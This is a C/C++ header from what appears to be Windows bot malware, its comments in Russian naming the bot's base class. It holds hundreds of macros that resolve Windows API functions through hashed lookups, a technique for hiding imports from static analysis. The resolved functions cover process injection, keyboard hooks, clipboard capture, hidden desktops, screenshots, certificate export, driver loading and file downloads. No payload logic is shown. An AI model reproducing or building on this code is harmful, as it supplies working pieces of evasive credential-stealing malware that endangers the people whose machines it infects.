#define pRegSaveKeyExA				pushargEx< DLL_ADVAPI32, 0xBBF053F6, 241 >
#define pRegSaveKeyExW				pushargEx< DLL_ADVAPI32, 0xBBF053E0, 242 >
#define pCryptAcquireContextA		pushargEx< DLL_ADVAPI32, 0x8AD7DE34, 243 >
#define pCryptReleaseContext		pushargEx< DLL_ADVAPI32, 0x72760BB8, 244 >
#define pCryptCreateHash            pushargEx< DLL_ADVAPI32, 0x3C4DE260, 245>
#define pCryptGenKey                pushargEx< DLL_ADVAPI32, 0x2433303E, 246>
#define pCryptDeriveKey             pushargEx< DLL_ADVAPI32, 0x3756058E, 247>
#define pCryptDestroyHash           pushargEx< DLL_ADVAPI32, 0xA5FFA46E, 248>
#define pCryptHashData              pushargEx< DLL_ADVAPI32, 0xF837A387, 249>

#define pCryptImportKey     		pushargEx< DLL_ADVAPI32, 0x78660DBE, 250 >
#define pCryptEncrypt    	    	pushargEx< DLL_ADVAPI32, 0xCEBF13BE, 251 >
#define pCryptDecrypt    	    	pushargEx< DLL_ADVAPI32, 0xCEBF17E6, 252 >
#define pCryptSetKeyParam   		pushargEx< DLL_ADVAPI32, 0x37A53419, 253 >
#define pCryptDestroyKey    		pushargEx< DLL_ADVAPI32, 0xD4B3D42, 254 >
#define pControlService				pushargEx< DLL_ADVAPI32, 0x5FFEE3F1, 255 >
#define pQueryServiceStatus		    pushargEx< DLL_ADVAPI32, 0xC033DB1C, 256 >
#define pSetServiceStatus		    pushargEx< DLL_ADVAPI32, 0x80C6B740, 257 >
#define pRegisterServiceCtrlHandlerA   pushargEx< DLL_ADVAPI32, 0x16B6D72E, 258 >
#define pStartServiceCtrlDispatcherA   pushargEx< DLL_ADVAPI32, 0x1B529B64, 259 >
#define pQueryServiceStatusEx		pushargEx< DLL_ADVAPI32, 0xF6C712F4, 260 >
#define pRegDeleteValueA			pushargEx< DLL_ADVAPI32, 0x560c7c4a, 261 >
#define pCloseServiceHandle			pushargEx< DLL_ADVAPI32, 0x78CEC357, 262 >
#define pAllocateAndInitializeSid	pushargEx< DLL_ADVAPI32, 0x28E9E291, 263 >
#define pCheckTokenMembership		pushargEx< DLL_ADVAPI32, 0x87FEDB50, 264 >
#define pFreeSid					pushargEx< DLL_ADVAPI32, 0x5CB5EF72, 265 >

//user32
#define pExitWindowsEx 				pushargEx< DLL_USER32, 0xAD7043A4, 266 >
#define pPeekMessageW 				pushargEx< DLL_USER32, 0xD7A87C3A, 267 >
#define pDispatchMessageW 			pushargEx< DLL_USER32, 0x4BAED1DE, 268 >
#define pMsgWaitForMultipleObjects 	pushargEx< DLL_USER32, 0xD36CEAF0, 269 >
#define pWaitForInputIdle			pushargEx< DLL_USER32, 0x4FAC81B4, 270 >
#define pGetWindowThreadProcessId	pushargEx< DLL_USER32, 0x6C7F716F, 271 >
#define pFindWindowA				pushargEx< DLL_USER32, 0x252B53B, 272 >
#define pGetSystemMetrics			pushargEx< DLL_USER32, 0x8EBEF5B1, 273 >
#define pGetActiveWindow			pushargEx< DLL_USER32, 0xDB7C98AC, 274 >
#define pGetKeyboardLayoutNameA		pushargEx< DLL_USER32, 0xEA0FAD78, 275 >
#define pOpenClipboard				pushargEx< DLL_USER32, 0x6ADFC795, 276 >
#define pGetClipboardData			pushargEx< DLL_USER32, 0x8E7AE818, 277 >
#define pCloseClipboard				pushargEx< DLL_USER32, 0xF0EC2212, 278 >
#define pGetWindowTextA				pushargEx< DLL_USER32, 0x9C29100A, 279 >
#define pGetWindowTextW				pushargEx< DLL_USER32, 0x9C29101C, 280 >
#define pGetForegroundWindow		pushargEx< DLL_USER32, 0xCACD450, 281 >
#define pGetWindowLongPtrA			pushargEx< DLL_USER32, 0x1D6C998B, 282 >
#define pGetWindowLongPtrW			pushargEx< DLL_USER32, 0x1D6C999D, 283 >
#define pEnumChildWindows			pushargEx< DLL_USER32, 0xAE8A5532, 284 >
#define pGetParent					pushargEx< DLL_USER32, 0x5992A5F2, 285 >
#define pGetDesktopWindow			pushargEx< DLL_USER32, 0xCD4AC62B, 286 >
#define pIsWindowVisible			pushargEx< DLL_USER32, 0xCFAAD7BF, 287 >
#define pIsWindowUnicode            pushargEx< DLL_USER32, 0x6EE99F86, 288 >
#define pSetWindowLongA				pushargEx< DLL_USER32, 0xBD6C998B, 289 >
#define pSetWindowLongW				pushargEx< DLL_USER32, 0xBD6C999D, 290 >
#define pGetWindowLongA				pushargEx< DLL_USER32, 0x1D6C998B, 291 >
#define pGetWindowLongW				pushargEx< DLL_USER32, 0x1D6C999D, 292 >
#define pSetLayeredWindowAttributes	pushargEx< DLL_USER32, 0x2DDBD2AF, 293 >
#define pSetWindowPos				pushargEx< DLL_USER32, 0xA92DF5AF, 294 >
#define pMessageBoxA				pushargEx< DLL_USER32, 0xABBC680D, 295 >
#define pMessageBoxW				pushargEx< DLL_USER32, 0xABBC681B, 296 >
#define pGetClassNameW				pushargEx< DLL_USER32, 0x484006A, 297 >
#define pGetClassNameA				pushargEx< DLL_USER32, 0x484007C, 298 >
#define pShowWindow					pushargEx< DLL_USER32, 0x7506E960, 299 >
#define pSendMessageW				pushargEx< DLL_USER32, 0x58A81C3F, 300 >
#define pSendMessageA				pushargEx< DLL_USER32, 0x58A81C29, 301 >
#define pEnumWindows				pushargEx< DLL_USER32, 0x9940B5CA, 302 >
#define pIsWindow					pushargEx< DLL_USER32, 0x9D4AF949, 303 >
#define pGetWindow					pushargEx< DLL_USER32, 0xDA12E549, 304 >
#define pCreateDesktopW				pushargEx< DLL_USER32, 0xC43ED7B1, 305 >
#define pCreateDesktopA				pushargEx< DLL_USER32, 0xC43ED7A7, 306 >
#define pGetThreadDesktop			pushargEx< DLL_USER32, 0x79F9B7FA, 307 >
#define pSwitchDesktop				pushargEx< DLL_USER32, 0x5B92DEA5, 308 >
#define pSetThreadDesktop			pushargEx< DLL_USER32, 0x79F99FFA, 309 >
#define pGetTopWindow				pushargEx< DLL_USER32, 0xC90E0C33, 310 >
#define pMoveWindow					pushargEx< DLL_USER32, 0x7234A16F, 311 >
#define pFindWindowExA				pushargEx< DLL_USER32, 0xAD4FFCD5, 312 >
#define pGetMessageA				pushargEx< DLL_USER32, 0xC8A274AC, 313 >
#define pSendMessageTimeoutW		pushargEx< DLL_USER32, 0x65846C69, 314 >
#define pSendMessageTimeoutA 		pushargEx< DLL_USER32, 0x65846C7F, 315 >
#define pSetClipboardViewer			pushargEx< DLL_USER32, 0x322391FC, 316 >
#define pIsClipboardFormatAvailable	pushargEx< DLL_USER32, 0xB161BF96, 317 >
#define pChangeClipboardChain   	pushargEx< DLL_USER32, 0x7CF84417, 318 >
#define pPostMessageA				pushargEx< DLL_USER32, 0xC8A87EA7, 319 >
#define pGetMessagePos 				pushargEx< DLL_USER32, 0x9D2F45DB, 320 >
#define pClientToScreen 			pushargEx< DLL_USER32, 0x543DF505, 321 >
#define pGetWindowRect  			pushargEx< DLL_USER32, 0x97F85FA0, 322 >
#define pDefWindowProcA 			pushargEx< DLL_USER32, 0xC6CE9B8A, 323 >
#define pCallWindowProcA 			pushargEx< DLL_USER32, 0xEE5FDA87, 324 >
#define pGetKeyNameTextW 			pushargEx< DLL_USER32, 0xAD34F519, 325 >
#define pGetKeyboardState			pushargEx< DLL_USER32, 0xF5E780A6, 326 >
#define pGetKeyboardLayout			pushargEx< DLL_USER32, 0xA0C69BF7, 327 >
#define pToUnicodeEx    			pushargEx< DLL_USER32, 0x2944D0D1, 328 >
#define pLoadCursorW    			pushargEx< DLL_USER32, 0xCFB2E5CF, 329 >
#define pLoadCursorA    			pushargEx< DLL_USER32, 0xCFB2E5D9, 330 >
#define pRegisterClassA    			pushargEx< DLL_USER32, 0xAEABC9A4, 331 >
#define pCreateWindowExA   			pushargEx< DLL_USER32, 0xBF7EFB5A, 332 >
#define pTranslateMessage   		pushargEx< DLL_USER32, 0xC45D9631, 333 >
#define pDispatchMessageA   		pushargEx< DLL_USER32, 0x4BAED1C8, 334 >
#define pGetWindowDC   				pushargEx< DLL_USER32, 0xB95254C7, 335 >
#define pReleaseDC					pushargEx< DLL_USER32, 0x4CB2D16D, 336 >
#define pFillRect					pushargEx< DLL_USER32, 0xCAD4D692, 337 >
#define pCallWindowProcW			pushargEx< DLL_USER32, 0xEE5FDA91, 338 >
#define pSetTimer       			pushargEx< DLL_USER32, 0x4D9CE557, 339 >
#define pDestroyWindow      		pushargEx< DLL_USER32, 0xEB4A6DB3, 340 >
#define pGetFocus           		pushargEx< DLL_USER32, 0x6D776D57, 341 >
#define pCharLowerBuffA        		pushargEx< DLL_USER32, 0x5FDA1871, 342 >
#define pCharLowerBuffW        		pushargEx< DLL_USER32, 0x5FDA1867, 343 >
#define pCharUpperBuffA        		pushargEx< DLL_USER32, 0xC0D4187D, 344 >
#define pCharUpperBuffW        		pushargEx< DLL_USER32, 0xC0D4186B, 345 >
#define pwvsprintfA 				pushargEx< DLL_USER32, 0x6B3AF0EC, 346 >
#define pwvsprintfW 				pushargEx< DLL_USER32, 0x6B3AF0FA, 347 >
#define pSetWindowsHookExA 			pushargEx< DLL_USER32, 0xB4584DDA, 348 >
#define pSetWindowsHookExW 			pushargEx< DLL_USER32, 0xB4584DCC, 349 >
#define pUnhookWindowsHookEx 		pushargEx< DLL_USER32, 0xB800C8A6, 350 >
#define pSetWindowTextA 			pushargEx< DLL_USER32, 0x3C29100A, 351 >
#define pSetWindowTextW 			pushargEx< DLL_USER32, 0x3C29101C, 352 >
#define pSetWindowLongPtrA			pushargEx< DLL_USER32, 0x334A94D2, 353 >
#define pSetWindowLongPtrW			pushargEx< DLL_USER32, 0x334A94C4, 354 >
#define pScreenToClient				pushargEx< DLL_USER32, 0xBDAE901A, 355 >
#define pGetClientRect				pushargEx< DLL_USER32, 0xA2F65BA2, 356 >
#define pGetDlgItem					pushargEx< DLL_USER32, 0x9CD421A8, 357 >
#define pCallNextHookEx				pushargEx< DLL_USER32, 0x8616AB9B, 358 >
#define pGetCursor					pushargEx< DLL_USER32, 0x199725ED, 359 >
#define pSetCursor					pushargEx< DLL_USER32, 0xD9725ED, 360 >
#define pGetAncestor			 	pushargEx< DLL_USER32, 0xAAFE9D1E, 361 >
#define pRegisterWindowMessageA	 	pushargEx< DLL_USER32, 0xE5D2B59, 362 >
#define pGetDC			        	pushargEx< DLL_USER32, 0x7CBD2247, 363 >
#define pGetClassLongA	        	pushargEx< DLL_USER32, 0x2544C17C, 364 >
#define pPrintWindow	        	pushargEx< DLL_USER32, 0xF404F170, 365 >
#define pGetWindowPlacement	       	pushargEx< DLL_USER32, 0xE06982CE, 366 >
#define pIsIconic			       	pushargEx< DLL_USER32, 0x3D687AAD, 367 >
#define pSetFocus			       	pushargEx< DLL_USER32, 0x6D5F6D57, 368 >
#define pSetActiveWindow			pushargEx< DLL_USER32, 0xDB7C98FC, 369 >
#define pSetCursorPos				pushargEx< DLL_USER32, 0xBDB58517, 370 >
#define pAttachThreadInput			pushargEx< DLL_USER32, 0xE16B4137, 371 >
#define pUpdateWindow				pushargEx< DLL_USER32, 0xFC3A1D7B, 372 >
#define pDestroyMenu				pushargEx< DLL_USER32, 0x6A50AD38, 373 >
#define pmouse_event				pushargEx< DLL_USER32, 0xAB3EFAFD, 374 >
#define pSetCapture					pushargEx< DLL_USER32, 0xEB747643, 375 >
#define pReleaseCapture				pushargEx< DLL_USER32, 0x6B0BEF18, 376 >
#define pBlockInput					pushargEx< DLL_USER32, 0xF103B589, 377 >
#define pSendInput					pushargEx< DLL_USER32, 0xce1781d0, 378 >
#define pEnumThreadWindows          pushargEx< DLL_USER32, 0x605A65D8, 379 >
#define pIsWindowEnabled			pushargEx< DLL_USER32, 0xEEC91F07, 380 >
#define pSendNotifyMessageA			pushargEx< DLL_USER32, 0x1AB922BF, 381 >

//winsock
#define pWSACleanup 				pushargEx< DLL_WINSOCK, 0x8FB8B5BD, 382 >
#define pWSAStartup 				pushargEx< DLL_WINSOCK, 0xCDDE757D, 383 >
#define psocket 					pushargEx< DLL_WINSOCK, 0xFC7AF16A, 384 >
#define pclosesocket 				pushargEx< DLL_WINSOCK, 0x939D7D9C, 385 >
#define paccept 					pushargEx< DLL_WINSOCK, 0x3C797B7A, 386 >
#define pbind 						pushargEx< DLL_WINSOCK, 0xC5A7764, 387 >
#define phtons 						pushargEx< DLL_WINSOCK, 0x8E9BF775, 388 >
#define plisten 					pushargEx< DLL_WINSOCK, 0x9E7D3188, 389 >
#define precv 						pushargEx< DLL_WINSOCK, 0xE5971F6, 390 >
#define psend 						pushargEx< DLL_WINSOCK, 0xE797764, 391 >
#define pconnect 					pushargEx< DLL_WINSOCK, 0xEDD8FE8A, 392 >
#define pshutdown 					pushargEx< DLL_WINSOCK, 0x4C7C5841, 393 >
#define pgethostbyname 				pushargEx< DLL_WINSOCK, 0xF44318C6, 394 >
#define pgethostbyaddr 				pushargEx< DLL_WINSOCK, 0xF5A25C51, 395 >
#define pinet_addr 					pushargEx< DLL_WINSOCK, 0x95E4A5D7, 396 >
#define pinet_ntoa 					pushargEx< DLL_WINSOCK, 0x9400A044, 397 >
#define pgetaddrinfo				pushargEx< DLL_WINSOCK, 0xD9F839BA, 398 >
#define pgetpeername				pushargEx< DLL_WINSOCK, 0xD939F838, 399 >
#define pselect						pushargEx< DLL_WINSOCK, 0x5D99726A, 400 >
#define psetsockopt					pushargEx< DLL_WINSOCK, 0xD8923733, 401 >
#define pWSAGetLastError			pushargEx< DLL_WINSOCK, 0x8E878072, 402 >
#define pWSASetLastError			pushargEx< DLL_WINSOCK, 0x8E850072, 403 >
#define pioctlsocket		     	pushargEx< DLL_WINSOCK, 0x1F935B1D, 404 >
#define pWSAFDIsSet   		     	pushargEx< DLL_WINSOCK, 0x4DFC1F3B, 405 >

//ntdll
#define pRtlInitUnicodeString 		pushargEx< DLL_NTDLL, 0x3287EC73, 406 >
#define pRtlInitAnsiString			pushargEx< DLL_NTDLL, 0xEE02056A, 407 >
#define pNtOpenFile 				pushargEx< DLL_NTDLL, 0x9C45B56C, 408 >
#define pNtOpenDirectoryObject 		pushargEx< DLL_NTDLL, 0xF5F11CF0, 409 >
#define pNtCreateSection 			pushargEx< DLL_NTDLL, 0x6E6F608B, 410 >
#define pNtOpenSection 				pushargEx< DLL_NTDLL, 0x5FA9AB38, 411 >
#define pZwLoadDriver 				pushargEx< DLL_NTDLL, 0x42F57D33, 412 >
#define pZwUnloadDriver 			pushargEx< DLL_NTDLL, 0x95849B61, 413 >
#define pRtlAdjustPrivilege 		pushargEx< DLL_NTDLL, 0xC2A6B1AE, 414 >
#define pZwMakeTemporaryObject 		pushargEx< DLL_NTDLL, 0x128CE9D3, 415 >
#define pNtClose 					pushargEx< DLL_NTDLL, 0x3D9AC241, 416 >
#define pRtlImageNtHeader			pushargEx< DLL_NTDLL, 0xDD39FD14, 417 >
#define pZwQuerySystemInformation	pushargEx< DLL_NTDLL, 0xBC44A131, 418 >
#define pZwUnmapViewOfSection		pushargEx< DLL_NTDLL, 0x9ED4D161, 419 >
#define pZwMapViewOfSection			pushargEx< DLL_NTDLL, 0x594D9A3C, 420 >
#define pZwQueueApcThread			pushargEx< DLL_NTDLL, 0xC0E4F6EE, 421 >
#define pZwResumeThread				pushargEx< DLL_NTDLL, 0xACF8BF39, 422 >
#define pZwTestAlert				pushargEx< DLL_NTDLL, 0xC952A06B, 423 >
#define pZwQueryInformationThread	pushargEx< DLL_NTDLL, 0xFAEDF3AA, 424 >
#define pZwOpenProcess				pushargEx< DLL_NTDLL, 0x9C0AC99D, 425 >
#define pZwOpenProcessToken			pushargEx< DLL_NTDLL, 0xADACBE07, 426 >
#define pZwClose					pushargEx< DLL_NTDLL, 0x3D9A9259, 427 >
#define pZwAllocateVirtualMemory	pushargEx< DLL_NTDLL, 0x594AA9E4, 428 >
#define pZwFreeVirtualMemory		pushargEx< DLL_NTDLL, 0xBED3922C, 429 >
#define pZwWriteVirtualMemory		pushargEx< DLL_NTDLL, 0xEEE7AF23, 430 >
#define pZwProtectVirtualMemory		pushargEx< DLL_NTDLL, 0x3836C63E, 431 >
#define pRtlCreateUserThread		pushargEx< DLL_NTDLL, 0xE9E0A4F7, 432 >
#define pLdrLoadDll					pushargEx< DLL_NTDLL, 0x78740534, 433 >
#define pLdrGetDllHandle			pushargEx< DLL_NTDLL, 0x7E287C6A, 434 >
#define pLdrGetProcedureAddress		pushargEx< DLL_NTDLL, 0x323C2875, 435 >
#define pZwSetContextThread			pushargEx< DLL_NTDLL, 0x62E2FE6F, 436 >
#define pZwSetInformationProcess	pushargEx< DLL_NTDLL, 0xCA2BF652, 437 >
#define pZwQueryInformationProcess	pushargEx< DLL_NTDLL, 0xA638CE5F, 438 >
#define pRtlImageDirectoryEntryToData pushargEx< DLL_NTDLL, 0x503f7b28, 439 >
#define pZwQueryInformationFile		pushargEx< DLL_NTDLL, 0x0f7ba4b7, 440 >
#define pZwShutdownSystem			pushargEx< DLL_NTDLL, 0x6F1C809E, 441 >
#define pRtlComputeCrc32			pushargEx< DLL_NTDLL,0x687B7023, 442 >
#define pNtQuerySystemInformation	pushargEx< DLL_NTDLL,0xB044A119, 443 >
#define pNtDeviceIoControlFile		pushargEx< DLL_NTDLL,0x385C70F2, 444 >
#define pNtMapViewOfSection			pushargEx< DLL_NTDLL,0x534E9A3C, 445 >
#define pNtUnmapViewOfSection		pushargEx< DLL_NTDLL,0x5ED4D3E1, 446 >


//winsta
#define pWinStationTerminateProcess	pushargEx< DLL_WINSTA, 0xA60C5F05, 447 >

//shell32
#define pSHGetSpecialFolderPathA 	pushargEx< DLL_SHELL32, 0xC95D8550, 448 >
#define pSHGetSpecialFolderPathW 	pushargEx< DLL_SHELL32, 0xC95D8546, 449 >
#define pFindExecutableA			pushargEx< DLL_SHELL32, 0x37707500, 450 >
#define pFindExecutableW			pushargEx< DLL_SHELL32, 0x37707516, 451 >
#define pSHGetFolderPathA			pushargEx< DLL_SHELL32, 0xDEAA9541, 452 >
#define pSHGetFolderPathW			pushargEx< DLL_SHELL32, 0xDEAA9557, 453 >
#define pShellExecuteW				pushargEx< DLL_SHELL32, 0x570BC88F, 454 >
#define pShellExecuteA				pushargEx< DLL_SHELL32, 0x570BC899, 455 >
#define pStrStrIW 					pushargEx< DLL_SHELL32, 0x3E3B7742, 456 > //	PTSTR StrStrI(PTSTR pszFirst,PCTSTR pszSrch);
#define pStrStrIA 					pushargEx< DLL_SHELL32, 0x3E3B7754, 457 >
#define pShellExecuteExA			pushargEx< DLL_SHELL32, 0xf2276983, 458 >
#define pShellExecuteExW			pushargEx< DLL_SHELL32, 0xf2276995, 459 >
#define pSHFileOperationA			pushargEx< DLL_SHELL32, 0x8B6D020B, 460 >
#define pSHFileOperationW			pushargEx< DLL_SHELL32, 0x8B6D021D, 461 >
#define pSHCreateDirectoryExA		pushargEx< DLL_SHELL32, 0xCD5CF4B2, 0 >
#define pSHCreateDirectoryExW		pushargEx< DLL_SHELL32, 0xCD5CF4A4, 0 >

//wininet
#define pInternetConnectA 			pushargEx< DLL_WININET, 0xBE618D3E, 462 >
#define pInternetConnectW 			pushargEx< DLL_WININET, 0xBE618D28, 463 >
#define pHttpOpenRequestA 			pushargEx< DLL_WININET, 0x1510002F, 464 >
#define pHttpOpenRequestW 			pushargEx< DLL_WININET, 0x15100039, 465 >
#define pHttpSendRequestA 			pushargEx< DLL_WININET, 0x9F13856A, 466 >
#define pHttpSendRequestW 			pushargEx< DLL_WININET, 0x9F13857C, 467 >
#define pInternetCloseHandle 		pushargEx< DLL_WININET, 0x7314FB0C, 468 >
#define pInternetQueryOptionA 		pushargEx< DLL_WININET, 0x2AE71934, 469 >
#define pInternetQueryOptionW 		pushargEx< DLL_WININET, 0x2AE71922, 470 >
#define pInternetSetOptionA 		pushargEx< DLL_WININET, 0x1AD09C78, 471 >
#define pInternetSetStatusCallback 	pushargEx< DLL_WININET, 0x9EF6461, 472 >
#define pHttpQueryInfoA 			pushargEx< DLL_WININET, 0x2F5CE027, 473 >
#define pHttpQueryInfoW 			pushargEx< DLL_WININET, 0x2F5CE031, 474 >
#define pHttpAddRequestHeadersA		pushargEx< DLL_WININET, 0xB5901061, 475 >
#define pHttpAddRequestHeadersW		pushargEx< DLL_WININET, 0xB5901077, 476 >
#define pGetUrlCacheEntryInfoW 		pushargEx< DLL_WININET, 0x57FBC0CB, 477 >
#define pGetUrlCacheEntryInfoA 		pushargEx< DLL_WININET, 0x57FBC0DD, 478 >
#define pFindFirstUrlCacheEntryA	pushargEx< DLL_WININET, 0xDDCB15D, 479 >
#define pFindNextUrlCacheEntryA		pushargEx< DLL_WININET, 0x8733D614, 480 >
#define pDeleteUrlCacheEntry		pushargEx< DLL_WININET, 0xA3A80AB6, 481 >
#define pFindCloseUrlCache			pushargEx< DLL_WININET, 0xFDE87743, 482 >
#define pInternetOpenA				pushargEx< DLL_WININET, 0x8593DD7, 483 >
#define pInternetOpenUrlA			pushargEx< DLL_WININET, 0xB87DBD66, 484 >
#define pInternetReadFile			pushargEx< DLL_WININET, 0x1A212962, 485 >
#define pInternetReadFileExA		pushargEx< DLL_WININET, 0x2C523864, 486 >
#define pInternetReadFileExW		pushargEx< DLL_WININET, 0x2C523872, 487 >
#define pReadUrlCacheEntryStream	pushargEx< DLL_WININET, 0x1672BC16, 488 >
#define pUnlockUrlCacheEntryStream	pushargEx< DLL_WININET, 0xEE22C82A, 489 >
#define pRetrieveUrlCacheEntryStreamA	pushargEx< DLL_WININET, 0x609C6936, 490 >
#define pFindFirstUrlCacheEntryExA  pushargEx< DLL_WININET, 0x2C567F36, 491 >
#define pFindNextUrlCacheEntryExA	pushargEx< DLL_WININET, 0xF5841D8D, 492 >
#define pDeleteUrlCacheEntryA		pushargEx< DLL_WININET, 0xD4055B10, 493 >
#define pCreateUrlCacheEntryA		pushargEx< DLL_WININET, 0x10815BF5, 494 >
#define pCommitUrlCacheEntryA		pushargEx< DLL_WININET, 0x548D61B6, 495 >


//urlmon
#define pURLDownloadToFileA			pushargEx< DLL_URLMON, 0xD95D2399, 496 >
#define pURLDownloadToFileW			pushargEx< DLL_URLMON, 0xD95D238F, 497 >
#define pObtainUserAgentString		pushargEx< DLL_URLMON, 0x534D481, 498 >


/* gdi32.dll */
#define pCreateCompatibleBitmap		  pushargEx< DLL_GDI, 0x6B3470D5, 499 >
#define pCreateCompatibleDC		      pushargEx< DLL_GDI, 0x5AF0017C, 500 >
#define pSelectObject       	      pushargEx< DLL_GDI, 0x4894DAFC, 501 >
#define pBitBlt             	      pushargEx< DLL_GDI, 0x9E90B462, 502 >
#define pDeleteDC            	      pushargEx< DLL_GDI, 0x5E10F525, 503 >
#define pDeleteObject           	  pushargEx< DLL_GDI, 0x48B87EFC, 504 >
#define pGetDeviceCaps           	  pushargEx< DLL_GDI, 0x39E9624F, 505 >
#define pCreateSolidBrush             pushargEx< DLL_GDI, 0xEF9AC06E, 506 >


/* gdiplus.dll */
#define pGdiplusStartup		          pushargEx< DLL_GDIPLUS, 0x55F74962, 507 >
#define pGdipCreateBitmapFromHBITMAP  pushargEx< DLL_GDIPLUS, 0xB7F0B572, 508 >
#define pGdipSaveImageToFile		  pushargEx< DLL_GDIPLUS, 0xE410B3EB, 509 >
#define pGdipDisposeImage	          pushargEx< DLL_GDIPLUS, 0x226FA923, 510 >
#define pGdiplusShutdown		      pushargEx< DLL_GDIPLUS, 0x99A24264, 511 >


//crypt32
#define pCertOpenSystemStoreA				pushargEx< DLL_CRYPT32, 0xEEA9ED9D, 512 >
#define pCertEnumCertificatesInStore		pushargEx< DLL_CRYPT32, 0x9897E094, 513 >
#define pPFXExportCertStoreEx				pushargEx< DLL_CRYPT32, 0xDFDB467E, 514 >
#define pCertCloseStore						pushargEx< DLL_CRYPT32, 0xCC1A6B6B, 515 >
#define pPFXImportCertStore					pushargEx< DLL_CRYPT32, 0x3A1B7F5D, 516 >
#define pCertAddCertificateContextToStore	pushargEx< DLL_CRYPT32, 0xDC6DD6E5, 517 >
#define pCertDuplicateCertificateContext	pushargEx< DLL_CRYPT32, 0x2F16F47, 518 >
#define pCertDeleteCertificateFromStore		pushargEx< DLL_CRYPT32, 0x5B08B5F, 519 >

// cryptdll.dll
#define pMD5Init	                        pushargEx< DLL_CRYPTDLL, 0x593A82D7, 520 >
#define pMD5Update	                        pushargEx< DLL_CRYPTDLL, 0x4110ACCA, 521 >
#define pMD5Final	                        pushargEx< DLL_CRYPTDLL, 0x6DA0A140, 522 >



//
//psapi.dll
#define	pGetMappedFileNameA			pushargEx< DLL_PSAPI, 0x860331a8, 523 >
#define pEnumProcessModules			pushargEx< DLL_PSAPI, 0x189F16C9, 524 >
#define pGetModuleBaseNameA			pushargEx< DLL_PSAPI, 0x7353EFE8, 525 >
#define pGetModuleFileNameExA		pushargEx< DLL_PSAPI, 0xE4FB2191, 526 >
#define pGetProcessImageFileNameA	pushargEx<DLL_PSAPI, 0x2741105, 527 >


//
//shlwapi.dll
#define	pPathFindFileNameA			pushargEx< DLL_SHLWAPI, 0xeed5398c, 528 >
#define pPathFindFileNameW			pushargEx< DLL_SHLWAPI, 0xEED5399A, 529 >
#define pPathCombineA				pushargEx< DLL_SHLWAPI, 0x45B615D5, 530 >
#define pPathCombineW				pushargEx< DLL_SHLWAPI, 0x45b615c3, 531 >
#define pStrStrA					pushargEx< DLL_SHLWAPI, 0x2A7C76E6, 532 >
#define pPathRemoveFileSpecA		pushargEx< DLL_SHLWAPI, 0xE6E3EE01, 533 >
#define pStrToIntA					pushargEx< DLL_SHLWAPI, 0xAAD270E7, 534 >
#define pStrToInt64ExA				pushargEx< DLL_SHLWAPI, 0xC3C5B48, 535 >
#define pPathAppendA				pushargEx< DLL_SHLWAPI, 0xF86AA1F6, 536 >
#define pPathAppendW				pushargEx< DLL_SHLWAPI, 0xF86AA1E0, 537 >
#define pPathIsDirectoryEmptyA		pushargEx< DLL_SHLWAPI, 0xCA98893B, 538 >
#define pPathStripPathA				pushargEx< DLL_SHLWAPI, 0x7EC609EF, 539 >
#define	pPathFindExtensionA			pushargEx< DLL_SHLWAPI, 0xDB2E50B6, 540 >
#define pPathFindExtensionW			pushargEx< DLL_SHLWAPI, 0xDB2E50A0, 541 >

//Iphlpapi.dll
#define	pGetIpNetTable				pushargEx< DLL_IPHLPAPI, 0xB8D99CE4, 542 >
#define	pGetAdaptersInfo			pushargEx< DLL_IPHLPAPI, 0xE69A1CD7, 543 >



//odbc32
#define pSQLAllocHandle				pushargEx< DLL_ODBC32, 0xEC1F2857, 544 >
#define pSQLSetEnvAttr				pushargEx< DLL_ODBC32, 0x88EE1E2C, 545 >
#define pSQLConnectA				pushargEx< DLL_ODBC32, 0x203F51DF, 546 >
#define pSQLDriverConnectA			pushargEx< DLL_ODBC32, 0x3941DBB7, 547 >
#define pSQLPrepareA				pushargEx< DLL_ODBC32, 0xC09D6D06, 548 >
#define pSQLBindCol					pushargEx< DLL_ODBC32, 0x3D09FC8B, 549 >
#define pSQLExecute					pushargEx< DLL_ODBC32, 0x8DE46D8A, 550 >
#define pSQLFetch					pushargEx< DLL_ODBC32, 0x6C1A778C, 551 >
#define pSQLCloseCursor				pushargEx< DLL_ODBC32, 0xACA2F119, 552 >
#define pSQLFreeHandle				pushargEx< DLL_ODBC32, 0x6A289300, 553 >
#define pSQLDisconnect				pushargEx< DLL_ODBC32, 0x8104CDA8, 554 >
#define pSQLBindParameter			pushargEx< DLL_ODBC32, 0xE8536508, 555 >
#define pSQLGetDiagRecA				pushargEx< DLL_ODBC32, 0x13C9473F, 556 >

//version.dll
#define pGetFileVersionInfoSizeA	pushargEx< DLL_VERSION, 0x8A94F707, 557 >
#define pGetFileVersionInfoA		pushargEx< DLL_VERSION, 0x7AA45C7A, 558 >
#define pVerQueryValueA				pushargEx< DLL_VERSION, 0x4E26C00F, 559 >

// ole32.dll
#define pCoCreateGuid				pushargEx< DLL_OLE32, 0xAA3E88A3, 560 >
#define pCoInitialize				pushargEx<DLL_OLE32, 0xF341D5CF, 561 >
#define pCoInitializeEx				pushargEx<DLL_OLE32, 0x7573DE28, 562 >
#define pCoUninitialize				pushargEx<DLL_OLE32, 0xEDB3159D, 563 >
#define pCoCreateInstance			pushargEx<DLL_OLE32, 0x368435BE, 564 >
#define pCoInitializeSecurity		pushargEx<DLL_OLE32, 0x910EACB3, 565 >

//winspool.drv
#define pAddPrintProvidorA			pushargEx<DLL_WINSPOOL, 0x4B12B4DF, 566 >
#define pDeletePrintProvidorA		pushargEx<DLL_WINSPOOL, 0x3D369C42, 567 >

//imagehlp
#define pCheckSumMappedFile			pushargEx<DLL_IMAGEHLP, 0xd5edc5a2, 568 >

//****************************************************************
//  Вспомогательные функции
//****************************************************************

#define Min(a,b) (((a) < (b)) ? (a) : (b))
#define Max(a,b) (((a) > (b)) ? (a) : (b))




DWORD inline pGetLastError() { return (DWORD)_pGetLastError(); }


//****************************************************************
//  TBotClass - базовый класс бота
//****************************************************************


class TBotObject
{
public:
	virtual ~TBotObject() {}

	void* operator new(size_t size);
	void* operator new[](size_t size);
	void  operator delete(void* Pointer);
	void  operator delete[](void* Pointer);
};


//----------------------------------------------------------------------------
#endif
